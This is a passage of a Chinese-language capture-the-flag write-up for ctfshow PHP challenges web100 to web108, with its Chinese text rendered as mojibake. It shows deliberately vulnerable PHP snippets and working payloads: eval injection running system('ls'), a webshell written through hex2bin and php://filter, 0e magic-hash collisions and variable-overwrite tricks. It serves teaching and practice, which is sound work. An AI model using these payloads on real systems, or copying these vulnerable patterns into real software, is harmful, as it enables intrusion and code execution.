<br>rand(1,$i)â€”â€”éšæœºç”Ÿæˆ1-877ä¹‹é—´çš„æ•°<br>&#x2F;&#x2F;æ‰€ä»¥array_push($allow, rand(1,$i))å°±æ˜¯å¾€æ•°ç»„ä¸­æ’å…¥1-877ä¹‹é—´çš„æ•°å­—<br>in_arrayâ€”â€”æœç´¢æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„å€¼:<br>in_array(search,array,type)<br>searchä¸ºæŒ‡å®šæœç´¢çš„å€¼<br>arrayä¸ºæŒ‡å®šæ£€ç´¢çš„æ•°ç»„<br>typeä¸ºTRUEåˆ™ å‡½æ•°è¿˜ä¼šæ£€æŸ¥ searchçš„ç±»å‹æ˜¯å¦å’Œ arrayä¸­çš„ç›¸åŒ</p><p>ç»¼ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°æ•°ç»„ä¸­çš„å€¼æ˜¯intï¼Œè€Œåœ¨å¼±ç±»å‹ä¸­å½“phpå­—ç¬¦ä¸²å’Œintæ¯”è¾ƒæ—¶,å­—ç¬¦ä¸²ä¼šè¢«è½¬æ¢æˆintï¼Œæ‰€ä»¥ å­—ç¬¦ä¸²ä¸­æ•°å­—åé¢çš„å­—ç¬¦ä¸²ä¼šè¢«å¿½ç•¥ã€‚é¢˜ç›®ä¸­çš„in_arrayæ²¡æœ‰è®¾ç½®type,æˆ‘ä»¬å¯ä»¥è¾“å…¥å­—ç¬¦ä¸²5.php(æ­¤å¤„æ•°å­—éšæ„ï¼Œåªè¦åœ¨rand(1,0x36d)ä¹‹é—´å³å¯)ï¼Œè½¬æ¢ä¹‹åä¹Ÿå°±æ˜¯5</p><p>çœ‹åˆ°file_put_contentsï¼Œå¯ä»¥ä½¿ç”¨phpä¼ªåè®®</p><h4 id="web100-is-numeric-è¿ç®—ç¬¦ä¼˜å…ˆçº§"><a href="#web100-is-numeric-è¿ç®—ç¬¦ä¼˜å…ˆçº§" class="headerlink" title="web100(is_numeric è¿ç®—ç¬¦ä¼˜å…ˆçº§)"></a>web100(is_numeric è¿ç®—ç¬¦ä¼˜å…ˆçº§)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ctfshow.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//flag in class ctfshow;</span><span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v2</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v3</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v0</span><span class="token operator">=</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;/"</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// v2ä¸èƒ½æœ‰;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;/"</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// v3å¿…é¡»æœ‰;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v2</span></span>('ctfshow')<span class="token interpolation"><span class="token variable">$v3</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>è¿ç®—ç¬¦ä¼˜å…ˆçº§ï¼š**&amp;&amp; &gt; || &gt; &#x3D; &gt; and &gt; or**</p><p><strong>is_numeric()</strong> å‡½æ•°ç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ã€‚</p><p>æ˜¯æ•°å­—å’Œæ•°å­—å­—ç¬¦ä¸²åˆ™è¿”å› TRUEï¼Œå¦åˆ™è¿”å› FALSE</p><p><strong>var_dump()<strong>å‡½æ•°å¯ä»¥è¾“å‡ºå¤šä¸ªå€¼ã€‚</strong>print_r</strong>ä¹Ÿå¯ä»¥</p><p><strong>&#x3D;<strong>çš„è¿ç®—ç¬¦æ¯”</strong>and</strong>é«˜</p><p>å¯¹äºv0çš„å€¼åªéœ€è¦çœ‹v1å°±å¯ä»¥v2,v3æ˜¯å¹²æ‰°</p><p>æ‰€ä»¥v1è¾“å…¥æ•°å­—</p><p>Payload:</p><blockquote><p>?v1&#x3D;11&amp;v2&#x3D;var_dump($ctfshow)&#x2F;<em>&amp;v3&#x3D;</em>&#x2F;;</p><p>?v1&#x3D;1&amp;v2&#x3D;system(â€˜lsâ€™)&#x2F;<em>&amp;v3&#x3D;</em>&#x2F;;</p></blockquote><p>æœ€åflag<code>0x2d</code>è¦è½¬åŒ–ä¸º<code>-</code></p><h4 id="web101-åå°„ç±»"><a href="#web101-åå°„ç±»" class="headerlink" title="web101(åå°„ç±»)"></a>web101(åå°„ç±»)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\"|\'|\,|\.|\;|\?|[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\"|\'|\,|\.|\?|[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v2</span></span>('ctfshow')<span class="token interpolation"><span class="token variable">$v3</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>æ¶‰åŠåˆ°ç±»ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨ ReflectionClass å»ºç«‹åå°„ç±»ã€‚</p><p>new ReflectionClass($class) å¯ä»¥è·å¾—ç±»çš„åå°„å¯¹è±¡ï¼ˆåŒ…å«å…ƒæ•°æ®ä¿¡æ¯ï¼‰ã€‚</p><p>å…ƒæ•°æ®å¯¹è±¡ï¼ˆåŒ…å«classçš„æ‰€æœ‰å±æ€§&#x2F;æ–¹æ³•çš„å…ƒæ•°æ®ä¿¡æ¯ï¼‰ã€‚</p><p>payloadï¼šv1&#x3D;1&amp;v2&#x3D;echo new ReflectionClass&amp;v3&#x3D;;</p><p>flagä¸­æœ‰äº›å­—ç¬¦ç»è¿‡ACSIIç å˜æ¢ï¼Œå¥½åƒè¿˜å°‘äº†ä¸€ä½ï¼Œçˆ†ç ´å³å¯</p><h4 id="web102-substr-call-user-func"><a href="#web102-substr-call-user-func" class="headerlink" title="web102(substr call_user_func)"></a>web102(substr call_user_func)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v4</span> <span class="token operator">=</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// æˆªå»äº†å‰ä¸¤ä¸ªå­—ç¬¦</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> </code></pre><p>**substr() **:å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†</p><p>**call_user_func()**ï¼šæŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°ä½¿ç”¨ï¼Œåé¢çš„å‚æ•°æ˜¯è¿™ä¸ªå‡½æ•°çš„å‚æ•°ã€‚è¿”å›è°ƒç”¨å‡½æ•°çš„è¿”å›å€¼ã€‚å…¶å®å°±æ˜¯ä¸€ç§ç‰¹æ®Šçš„è°ƒç”¨å‡½æ•°çš„æ–¹å¼ã€‚</p><p><strong>php5</strong>ä¸‹is_numericå¯è¯†åˆ«16è¿›åˆ¶ï¼Œå¦‚0x2eï¼Œç„¶åè°ƒç”¨hex2binè½¬æˆå­—ç¬¦ä¸²å†™å…¥æœ¨é©¬ï¼Œä½†é¢˜ç›®ç¯å¢ƒæ²¡é…å¥½ï¼Œæ˜¯<strong>php7</strong>,æ‰€ä»¥è¦å¦æ¢æ–¹æ³•ã€‚<br>ç”¨ä¼ªåè®®å†™å…¥ï¼Œæ‰€ä»¥éœ€è¦base64ç¼–ç åè½¬æˆ16è¿›åˆ¶å…¨æ˜¯æ•°å­—çš„å­—ç¬¦ä¸²</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'&lt;?=`cat *`;'</span><span class="token punctuation">;</span> <span class="token variable">$b</span><span class="token operator">=</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//$a=PD89YGNhdCAqYDs=</span> <span class="token variable">$c</span><span class="token operator">=</span><span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'PD89YGNhdCAqYDs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span> å¾—åˆ°5044383959474e6864434171594473</code></pre><p><strong>PHPçŸ­æ ‡ç­¾</strong></p><?=(è¡¨è¾¾å¼)?><p>ç­‰ä»·äº<?php echo (è¡¨è¾¾å¼)?></p><p>Payload:</p><blockquote><p>GET:?v2&#x3D;115044383959474e6864434171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php</p><p>POST:v1&#x3D;hex2bin</p></blockquote><h4 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/.*p.*h.*p.*/i"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Sorry'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>åŠ äº†ä¸ªé¸¡è‚‹çš„é™åˆ¶ï¼Œå› ä¸ºæœ¬æ¥å°±æ˜¯ç”¨base64åŠ å¯†åçš„ï¼Œæ‰€ä»¥æ²¡ä»€ä¹ˆå½±å“</p><h4 id="web104-md5-sha1"><a href="#web104-md5-sha1" class="headerlink" title="web104(md5 sha1)"></a>web104(md5 sha1)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>shalå‡½æ•°å°±æ˜¯è®¡ç®—æ•£åˆ—å‡½æ•°ï¼Œå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªä¸å¯é€†çš„åŠ å¯†å‡½æ•°ï¼Œè¿™é¢˜æ²¡å•¥è¿‡æ»¤ï¼Œç›´æ¥ä¼ ä¸¤ä¸ªç›¸åŒçš„å‚æ•°å°±å¥½äº†ï¼Œæ„é€ payload</p><p>æˆ–è€…ä½¿ç”¨æ•°ç»„ä¹Ÿå¯ä»¥ç»•è¿‡</p><p>å€¼çš„åˆ¤æ–­æ˜¯ä½¿ç”¨ <code>==</code>ï¼Œæ‰€ä»¥æ‰¾åŠ å¯†å 0e å¼€å¤´çš„ä¸¤ä¸ªå€¼ä¹Ÿå¯ä»¥ã€‚</p><blockquote><p>aaK1STfY -&gt; 0e76658526655756207688271159624026011393</p><p>aaO8zKZF -&gt; 0e89257456677279068558073954252716165668</p></blockquote><p>ä»¥ä¸‹è¿™äº›å­—ç¬¦ä¸²ï¼Œmd5å“ˆå¸Œä¹‹åéƒ½æ˜¯0eå¼€å¤´çš„ï¼š</p><blockquote><p>QLTHNDT -&gt; 0e405967825401955372549139051580</p><p>QNKCDZO -&gt; 0e830400451993494058024219903391 </p><p>s878926199a -&gt; 0e545993274517709034328855841020</p></blockquote><h4 id="web105-phpå˜é‡è¦†ç›–"><a href="#web105-phpå˜é‡è¦†ç›–" class="headerlink" title="web105(phpå˜é‡è¦†ç›–)"></a>web105(phpå˜é‡è¦†ç›–)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$error</span><span class="token operator">=</span><span class="token string single-quoted-string">'ä½ è¿˜æƒ³è¦flagå˜›ï¼Ÿ'</span><span class="token punctuation">;</span><span class="token variable">$suces</span><span class="token operator">=</span><span class="token string single-quoted-string">'æ—¢ç„¶ä½ æƒ³è¦é‚£ç»™ä½ å§ï¼'</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token operator">===</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$$key</span><span class="token operator">=</span><span class="token variable">$$value</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token operator">===</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$$key</span><span class="token operator">=</span><span class="token variable">$$value</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"your are good"</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$suces</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><ul><li><p>æœ¬é¢˜è€ƒæŸ¥å˜é‡è¦†ç›–å’Œ<code>die()</code>çš„çŸ¥è¯†</p></li><li><p><code>$$a = $$b</code>å¯ä»¥ç±»ä¼¼äºï¼Œå°†$açš„åœ°å€æŒ‡å‘$b</p><p>æ‰€ä»¥æ— è®º$bæ€ä¹ˆæ”¹å˜å€¼ï¼Œ$açš„å€¼éƒ½ä¼šå’Œ$bä¸€æ ·</p></li><li><p><code>die()</code>å‡½æ•°è™½ç„¶ä¼šç»ˆæ­¢ç¨‹åºï¼Œä½†åŒæ—¶ä¹Ÿä¼šè¾“å‡ºæ‹¬å·å†…çš„ç»ˆæ­¢æç¤ºä¿¡æ¯</p></li><li><p>æœ¬é¢˜åˆ©ç”¨å˜é‡è¦†ç›–å’Œ<code>die()</code>å‡½æ•°çš„ç‰¹æ€§</p><ol><li>å…ˆå¯¹getçš„å†…å®¹è¿›è¡Œè¦†ç›–ï¼Œä¸”ä¸èƒ½è¦†ç›–errorï¼Œæ‰€ä»¥è¦è¦†ç›–sucesï¼Œå³?suces&#x3D;flagï¼Œæ­¤æ—¶suces&#x3D;&gt;flagçš„åœ°å€</li><li>å†å¯¹postçš„å†…å®¹è¿›è¡Œè¦†ç›–ï¼Œä¸”ä¸èƒ½å°†flagç›´æ¥è¦†ç›–ï¼Œæ‰€ä»¥åªèƒ½error&#x3D;sucesï¼Œæ­¤æ—¶error&#x3D;&gt;flagçš„åœ°å€</li><li>æ­¤æ—¶æ— è®ºè¿›å…¥å“ªä¸ª<code>die()</code>å‡½æ•°ï¼Œéƒ½å¯ä»¥è¾“å‡º<code>$flag</code>çš„å€¼</li></ol></li></ul><p>Payload:</p><blockquote><p>GET:?suces&#x3D;flag</p><p>POST:error&#x3D;suces</p></blockquote><h4 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$v1</span><span class="token operator">!=</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> </code></pre><p>åŠ äº†é™åˆ¶ï¼ŒPayloadåŒ104</p><h4 id="web107-parse-str"><a href="#web107-parse-str" class="headerlink" title="web107(parse_str)"></a>web107(parse_str)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </code></pre><p><strong>parse_str</strong>($v1,$v2); &#x2F;&#x2F;æŠŠv1çš„å€¼ç›¸åº”çš„æ¢æˆé”®å€¼å¯¹å†å­˜å…¥v2(æ•°ç»„)<br>v1&#x3D;flag&#x3D;114&amp;index&#x3D;300çš„è¯ï¼Œ<br>v2å°±å˜æˆä¸€ä¸ªæ•°ç»„ï¼Œå†…å®¹ä¸ºflagâ€“&gt;114      indexâ€“&gt;300ï¼ˆåˆ†ä¸ºè¿™ä¸¤ä¸ªé”®å€¼å¯¹ï¼‰</p><p>æ‰€ä»¥åªéœ€è¦è®©ä¼ å…¥çš„flag md5å€¼ä¸v3ä¸€æ ·å°±å¯</p><p>Payload:</p><blockquote><p>POST:v1&#x3D;flag&#x3D;47bce5c74f589f4867dbd57e9ca9f808</p><p>GET:?v3&#x3D;aaa</p></blockquote><h4 id="we108-ereg-NULLæˆªæ–­æ¼æ´"><a href="#we108-ereg-NULLæˆªæ–­æ¼æ´" class="headerlink" title="we108(ereg NULLæˆªæ–­æ¼æ´)"></a>we108(ereg NULLæˆªæ–­æ¼æ´)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ereg</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"^[a-zA-Z]+$"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">FALSE</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//åªæœ‰36dçš„äººæ‰èƒ½çœ‹åˆ°flag</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </code></pre><p>ereg (â€œ^[a-zA-Z]+$â€, $_GET[â€˜câ€™])&#x3D;&#x3D;&#x3D;FALSE</p><p>ereg()å‡½æ•°ç”¨æŒ‡å®šçš„æ¨¡å¼æœç´¢ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æŒ‡å®šçš„å­—ç¬¦ä¸²,å¦‚æœåŒ¹é…æˆåŠŸè¿”å›true,å¦åˆ™,åˆ™è¿”å›falseã€‚æœç´¢å­— 